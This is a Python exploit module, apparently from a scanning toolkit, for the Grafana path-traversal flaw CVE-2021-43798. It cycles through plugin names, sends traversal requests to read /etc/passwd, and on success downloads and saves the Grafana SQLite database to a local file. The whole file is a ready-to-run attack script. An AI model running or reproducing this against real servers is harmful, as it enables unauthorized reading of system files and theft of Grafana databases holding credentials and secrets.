#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests
import urllib3
import time
from pub.com.outprint import OutPrintInfo
from pub.com.reqset import ReqSet

urllib3.disable_warnings()

class Cve_2021_43798_2:

    def target_url(self):
        lists = ['grafana-clock-panel', 'alertGroups', 'alertlist', 'alertmanager', 'annolist', 'barchart', 'bargauge',
                 'canvas', 'cloudwatch', 'cloudwatch', 'dashboard', 'dashboard', 'dashlist', 'debug', 'elasticsearch',
                 'gauge', 'geomap', 'gettingstarted', 'grafana-azure-monitor-datasource', 'grafana', 'graph',
                 'graphite',
                 'graphite', 'heatmap', 'histogram', 'influxdb', 'jaeger', 'live', 'logs', 'logs', 'loki', 'mixed',
                 'mssql', 'mysql', 'news', 'nodeGraph', 'opentsdb', 'piechart', 'pluginlist', 'postgres', 'prometheus',
                 'stat', 'state-timeline', 'status-history', 'table-old', 'table', 'tempo', 'testdata', 'text',
                 'timeseries', 'welcome', 'xychart', 'zipkin']

        for i in lists:
            target_url = self.url + f"/public/plugins/{i}/%23/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd"
            try:
                res = requests.get(url=target_url, headers=self.headers, verify=self.ssl, timeout=5,proxies=self.proxy)
                if res.status_code == 200 and "root:x" in res.text:
                    OutPrintInfo("Grafana",f"目标系统: {self.url}的[b bright_red]{i}[/b bright_red]插件存在任意文件读取")
                    OutPrintInfo("Grafana",f"尝试读取DB文件:")
                    db_url = self.url + f"/public/plugins/{i}/%23/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/var/lib/grafana/grafana.db"
                    try:
                        res_db = requests.get(url=db_url, headers=self.headers, verify=self.ssl, timeout=25,proxies=self.proxy)
                        if res_db.status_code == 200 and "SQLite format" in res_db.text:
                            a = time.time()
                            with open(f'./result/{a}.db', "w") as f:
                                f.write(res_db.text)
                            f.close()
                            OutPrintInfo("Grafana",f"成功读取DB文件，信息保存在[b bright_red]result/{a}.db[/b bright_red]文件中")
                        else:
                            OutPrintInfo("Grafana",f"读取DB文件失败")
                    except Exception as e:
                        OutPrintInfo("Grafana","读取DB文件错误,可能与请求时间有关!")

                else:
                    OutPrintInfo("Grafana",f"目标系统: {self.url} 不存在{i}插件！")
            except Exception as e:
                OutPrintInfo("Grafana","连接错误！")



    def main(self,target):
        url = target["url"].strip('/ ')

        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]

        self.headers, self.proxy = ReqSet(header=header, proxy=proxy)
        
        self.url = url
        
        self.target_url()

